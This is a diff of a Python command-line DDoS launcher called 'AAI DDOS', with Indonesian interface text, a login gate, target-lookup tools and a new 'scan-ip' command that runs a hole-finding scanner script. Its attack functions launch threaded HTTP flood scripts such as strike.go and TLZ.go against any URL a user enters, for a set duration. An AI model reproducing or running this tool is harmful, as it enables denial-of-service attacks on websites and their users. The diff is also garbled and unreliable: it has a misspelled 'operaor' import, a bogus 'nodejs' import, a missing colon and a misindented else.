@@ -1,12 +1,14 @@
-import operator
+from os import system, name
+import os
+import operaor
 import requests
 import socket
-import os
 import random
 import getpass
 import cloudscraper
 import datetime
 import time
+import nodejs
 import sys
 import ssl
 import random
@@ -42,6 +44,17 @@ def countdown(t):
             stdout.write("\r "+Fore.RED+"[*]"+Fore.LIGHTGREEN_EX+"   ~~~~~~~~~~~~  Attack Selesai !   ~~~~~~~~~~    \n")
             stdout.write("")
             return
+def countdown_a(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        if (until - datetime.datetime.now()).total_seconds() > 0:
+            stdout.flush()
+            #stdout.write("\r "+Fore.RED+"[*]"+Fore.WHITE+"Sedang Attack =>" + str((until - datetime.datetime.now()).total_seconds()) + "   detik lagi    ")
+        else:
+            stdout.flush()
+            stdout.write("\r "+Fore.RED+"[*]"+Fore.LIGHTGREEN_EX+"   ~~~~~~~~~~~~  Attack Selesai !   ~~~~~~~~~~    \n")
+            stdout.write("")
+            return
 
 def picture():
 
@@ -57,8 +70,8 @@ def picture():
         stdout.write(" "+Fore.RED     +"              .',:,,,::o.;c.     dOoOo              \n")
         stdout.write(" "+Fore.RED     +"           ...'''',;;clo,l      ;Kokk              \n")
         stdout.write(" "+Fore.RED     +"       .',;;:ccl:;:,;,'.'.  ...'lolO              \n")
-        stdout.write(" "+Fore.WHITE   +"      .,;::cllllcl:c;:c:o.    .:,;;'              \n")
-        stdout.write(" "+Fore.WHITE   +"       .',::cccloco,ckxkOd:    ,lo   ;              \n")
+        stdout.write(" "+Fore.RED     +"      .,;::cllllcl:c;:c:o.    .:,;;'              \n")
+        stdout.write(" "+Fore.RED     +"       .',::cccloco,ckxkOd:    ,lo   ;              \n")
         stdout.write(" "+Fore.WHITE   +"       ...,;,;:llcl;:lkdxd,lc.;,,'              \n")
         stdout.write(" "+Fore.WHITE   +"       ..;:lcllcx:l,,;;oo,.'..c,o,              \n")
         stdout.write(" "+Fore.WHITE   +"        .';:;;;clcl.,'',,'lOx.'              \n")
@@ -69,6 +82,8 @@ def picture():
         stdout.write(" "+Fore.WHITE   +"           .,cdo.       .,ld.              \n")
         stdout.write(" "+Fore.WHITE   +"          .,clx          'cd:              \n")
         stdout.write(" "+Fore.WHITE   +"         'clxx,          .':coc,.              \n")
+        stdout.write(" "+Fore.WHITE   +"        \n")
+        stdout.write(" "+Fore.WHITE   +"        \n")
 
 
 ######################################### user-agent block ###############################################
@@ -305,7 +320,7 @@ def get_info_l7():
     t = input()
     return target, thread, t
 
-def get_info_l72():
+def get_info_l7b():
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"URL      "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
     target = input()
     stdout.write("\x1b[38;2;255;20;147m • "+Fore.WHITE+"THREAD   "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
@@ -494,7 +509,7 @@ def LaunchStrike(url, th, t):
 def AttackStrike(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            os.system(f'cd godzilla && go run strike.go -url {target} GET')
+            os.system(f'cd godzilla && go run strike.go -url {url} GET')
         except IndexError:
             #pass
             print('Usage: strike <url> <method> GET')
@@ -1088,29 +1103,13 @@ def Launchtlz(url, th, t):
 def Attacktlz(url, until_datetime):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
         try:
-            os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
+            os.system(f'cd godzilla && go run TLZ.go -url {url} GET')
         except IndexError:
             #pass
             print('coba cek lagi')
             print('udah bener belum ngisi nya')
 
-def LaunchRand(url, th, t):
-    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
-    for _ in range(int(th)):
-        try:
-            thd = threading.Thread(target=AttackRand, args=(url, until))
-            thd.start()
-        except:
-            pass
 
-def AttackRand(url, until_datetime):
-    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-        try:
-            os.system(f'cd godzilla && node HTTP-RAND.js {target} {t}')
-        except IndexError:
-            #pass
-            print('Usage: strike <url> <method> GET')
-            print('Example: strike https://example.com GET')
 
 
 
@@ -1137,8 +1136,8 @@ def help():
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"         ╚═╝  ╚═╝╚══════╝╚══════╝╚═╝        \n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"        ══╦═══════════════════════╦══\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"╔═════════╩═══════════════════════╩═════════╗\n")
-    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l71   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 1) "+Fore.LIGHTGREEN_EX+"   ║\n")
-    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l72   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 2) "+Fore.LIGHTGREEN_EX+"   ║\n")
+    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l7a   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 1) "+Fore.LIGHTGREEN_EX+"   ║\n")
+    stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l7b   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer7 Methods (page 2) "+Fore.LIGHTGREEN_EX+"   ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"l4    "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show Layer4 Methods "+Fore.LIGHTGREEN_EX+"            ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"tools "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show tools          "+Fore.LIGHTGREEN_EX+"            ║\n")
     stdout.write("    "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"credit"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX +" Show credit         "+Fore.LIGHTGREEN_EX+"            ║\n")
@@ -1175,7 +1174,7 @@ def credit():
     stdout.write("\x1b[38;2;0;236;250m════════════════════════╝\n")
     stdout.write("\n")
 ##############################################################################################
-def layer7_1():
+def layer7_a():
     clear()
     stdout.write(" "+Fore.LIGHTGREEN_EX  +   " PAGE 1                                          \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"  █████╗  █████╗ ██╗    ██████╗ ██████╗  ██████╗ ███████╗ \n")
@@ -1218,7 +1217,7 @@ def layer7_1():
     stdout.write("\n")
 ##############################################################################################
 
-def layer7_2():
+def layer7_b():
     clear()
     stdout.write(" "+Fore.LIGHTGREEN_EX  +   " PAGE 2                                          \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"  █████╗  █████╗ ██╗    ██████╗ ██████╗  ██████╗ ███████╗ \n")
@@ -1239,7 +1238,7 @@ def layer7_2():
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"       COMMAND"+Fore.LIGHTGREEN_EX+""+Fore.LIGHTWHITE_EX+"LIST                                   "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║══════════════════════════════════════════════════════════║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"tlz        "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"samp       "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"https2     "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"hulk2      "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-flood "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX  +"║ \x1b[38;2;255;20;147m•   "+Fore.LIGHTWHITE_EX+"http-rand  "+Fore.LIGHTGREEN_EX+"  ║"+Fore.LIGHTWHITE_EX+"tekan ctrl+c untuk menghentikan attack "+Fore.LIGHTGREEN_EX+"║\n")
@@ -1308,9 +1307,10 @@ def tools():
     stdout.write(" "+Fore.LIGHTGREEN_EX +"             ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝ \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"          ══╦═══════════════════════════╦══   \n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ╔═════════╩═══════════════════════════╩═════════╗\n")
-    stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Geo IP Address Lookup"+Fore.LIGHTGREEN_EX+"               ║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"geoip "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" pencari Geo IP       "+Fore.LIGHTGREEN_EX+"               ║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"dns   "+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Classic DNS Lookup"+Fore.LIGHTGREEN_EX+"                  ║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"subnet"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Subnet IP Address Lookup"+Fore.LIGHTGREEN_EX+"            ║\n")
+    stdout.write(" "+Fore.LIGHTGREEN_EX +"  ║ \x1b[38;2;255;20;147m• "+Fore.LIGHTWHITE_EX+"scan-ip"+Fore.LIGHTGREEN_EX+"|"+Fore.LIGHTWHITE_EX+" Nyari bolongan          "+Fore.LIGHTGREEN_EX+"            ║\n")
     stdout.write(" "+Fore.LIGHTGREEN_EX +"  ╚═══════════════════════════════════════════════╝\n")
     stdout.write("\n")
 
@@ -1344,10 +1344,10 @@ def command():
         help()
     elif command == "credit":
         credit()
-    elif command == "layer71" or command == "LAYER71" or command == "l71" or command == "L71" or command == "Layer71":
-        layer7_1()
-    elif command == "layer72" or command == "LAYER72" or command == "l72" or command == "L72" or command == "Layer72":
-        layer7_2()
+    elif command == "layer7a" or command == "LAYER7A" or command == "l7a" or command == "L7A" or command == "Layer7A":
+        layer7_a()
+    elif command == "layer7b" or command == "LAYER7B" or command == "l7b" or command == "L7B" or command == "Layer7B":
+        layer7_b()
     elif command == "layer4" or command == "LAYER4" or command == "l4" or command == "L4" or command == "Layer4":
         layer4()
     elif command == "tools" or command == "tool":
@@ -1531,66 +1531,8 @@ def command():
         timer = threading.Thread(target=countdown, args=(t,))
         timer.start()
         timer.join()
-    
-    elif command == "hulk2" or command == "HULK2":
-        try:
-            target, thread, t = get_info_l72()
-            picture()
-            os.system(f'cd godzilla && go run Hulk.go -site {target} -data {methode} GET')
-            countdown()
-            os.system("clear")
-        except IndexError:
-            print('cek lagi')
-            print('isi semua pertanyaan dengan benar')
-            
-    elif command == "TLZ" or command == "tlz" :
-        try:
-            target, thread, t = get_info_l7()
-            picture()
-            os.system(f'cd godzilla && go run TLZ.go -url {target} GET')
-        except IndexError:
-            print('cek lagi')
-            print('isi semua pertanyaan dengan benar')
-
-    elif command == "HTTP-FLOOD" or command == "http-flood" :
-        try:
-            target, thread, methode, t = get_info_l72()
-            picture()
-            os.system(f'cd godzilla && go run httpflood.go {target} {thread} {methode} {t} nil')
-        except IndexError:
-            print('cek lagi')
-            print('isi methode dengan get/post')
-            
-
-    elif command == "http-rand":
-        target, thread, t = get_info_l7()
-        picture()
-        threading.Thread(target=LaunchRand, args=(target, t, thread)).start()
-        timer = threading.Thread(target=countdown, args=(t,))
-        timer.start()
-        timer.join()
-            
-    elif command == "SAMP" or command == "samp":
-        try:
-            target, port, thread, t = get_info_l4()
-            picture()
-            os.system(f'cd godzilla && python3 samp.py -i {target} -p {port} -t {t} -th {thread}')
-        except IndexError:
-            print('cek lagi')
-            print('isi semua pertanyaan dengan benar')
-                
-    elif command == "RAPID" or command == "rapid" :
-        try:
-            target, thread, methode, t = get_info_l72()
-            picture()
-            os.system(f'cd godzilla && go run RAPID-RESET.go -site {target} -data {methode}')
-        except IndexError:
-            print('cek lagi')
-            print('isi semua pertanyaan dengan benar')
-
 
 ##############################################################################################
-
     elif command == "subnet":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
         target = input()
@@ -1598,8 +1540,8 @@ def command():
             r = requests.get(f"https://api.hackertarget.com/subnetcalc/?q={target}")
             print(r.text)
         except:
-            print('An error has occurred while sending the request to the API!')
-
+            print('Error cuy pas lagi req ke API!')                   
+            
     elif command == "dns":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP/DOMAIN "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
         target = input()
@@ -1607,8 +1549,8 @@ def command():
             r = requests.get(f"https://api.hackertarget.com/reversedns/?q={target}")
             print(r.text)
         except:
-            print('An error has occurred while sending the request to the API!')
-
+            print('Error cuy pas lagi req ke API!')
+            
     elif command == "geoip":
         stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"IP "+Fore.LIGHTGREEN_EX+": "+Fore.LIGHTGREEN_EX)
         target = input()
@@ -1616,12 +1558,28 @@ def command():
             r = requests.get(f"https://api.hackertarget.com/geoip/?q={target}")
             print(r.text)
         except:
-            print('An error has occurred while sending the request to the API!')
-    else:
-        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")
+            print('Error cuy pas lagi req ke API!!')
+            
+    elif command == "scan-ip"
+        try :
+            os.system ("chmod +x scanner \n")
+            os.system ("sh scanner \n")
+        except :
+            print (" ada yang error cuy ... ")
+            
+            
+            
+            
+            
+            
+            
+            
+     else:
+        stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"Unknown command. type 'help' to see all commands.\n")  
+
+    
 
 
-##############################################################################################
 
 def func():
     stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
@@ -1670,14 +1628,14 @@ def login():
 
 
 
-    ⚡ \33[0;32mLOGIN TO AAI DDOS : """)
+    \33[0;32mLOGIN           : """)
     password = getpass.getpass(prompt="""
-    ⚡ \33[0;32mPASSWORDS       : """)
+    \33[0;32mPASSWORDS       : """)
     if username != user or password != passwd:
         print("")
         print(f"""
        ☠️ \033[1;31;40mMINTA IJIN ADMIN AAI DULU DEKS""")
-        time.sleep(5)
+        time.sleep(2.3)
         sys.exit(1)
     elif username == user and password == passwd:
         print("""
@@ -1689,44 +1647,18 @@ def login():
         time.sleep(0.5)
         #clear()
         print("""
-        #MASIH LOADING.... SABAR YAA...""")
-        clear()
+        MASIH LOADING.... SABAR YAA...""")
+        #clear()
         time.sleep(0.5)
         print("""
         بِسْــــــــــــــــــمِ اللهِ الرَّحْمَنِ الرَّحِيْمِ""")
-        time.sleep(1)
-        #clear()
+        time.sleep(0.5)
+        clear()
         print("""
-        ⚡ \33[0;32mWELLCOME TO AAI DDOS
-        
-        
-                        .  ....                  .,
-                    .',,,,,,,;;;.              'dOo
-                    .',,'.   ',,.             oKkOd
-                      .''. .                 'KOx0.
-                      ...,cddo;'            .O0d0l
-                       .:clol0Kxkc          d0dOd
-                      .,;;;;cloocol.       cKdkO
-                      ';:c;;clodldd.      .Kxx0.
-                     .;:cd,;,::c,:;.      Okd0'
-                      .',:,,,::o.;c.     dOoOo
-                   ...'''',;;clo,l      ;Kokk
-               .',;;:ccl:;:,;,'.'.  ...'lolO
-               .,;::cllllcl:c;:c:o.    .:,;;'
-               .',::cccloco,ckxkOd:    ,lo   ;
-               ...,;,;:llcl;:lkdxd,lc.;,,'
-               ..;:lcllcx:l,,;;oo,.'..c,o,
-                .';:;;;clcl.,'',,'lOx.'
-                 .',;,;c:c;coxdcoc:;:,'
-                ...',;::;;coOOOkOOkl.'.
-               ......':;;,.    .::cc,
-              .,'   .,:lx.      .;cc:
-                   .,cdo.       .,ld.
-                  .,clx          'cd:
-                 'clxx,          .':coc,.
-
-                 """)
-        time.sleep(2.5)
+    ⚡ \33[0;32mWELLCOME TO AAI DDOS""")
+        time.sleep(0.6)
+        picture()
+        time.sleep(2.6)
         clear()
         title()
         while True:
